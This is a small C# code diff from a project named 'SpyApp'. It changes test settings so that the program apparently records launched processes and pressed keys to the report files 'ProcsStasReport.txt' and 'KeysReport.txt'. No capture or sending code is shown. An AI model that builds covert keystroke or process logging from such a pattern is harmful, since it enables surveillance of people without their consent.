@@ -22,10 +22,11 @@ namespace SpyApp
                 //info.DeserializeFromString(args[0]);
 
                 //тестовый набор
-                //info.StatsOn = true;
-                //info.ProcessesStats = "ProcsStasReport.txt";
-                info.ModerOn = true;
-                info.ReportModer = "KeysReport.txt";
+                info.StatsOn = true;
+                info.LaunchedProcesses = "ProcsStasReport.txt";
+                info.PressedKeys = "KeysReport.txt";
+                //info.ModerOn = true;
+                
                 //
 
                 var props = typeof(SpyInfo).GetProperties();
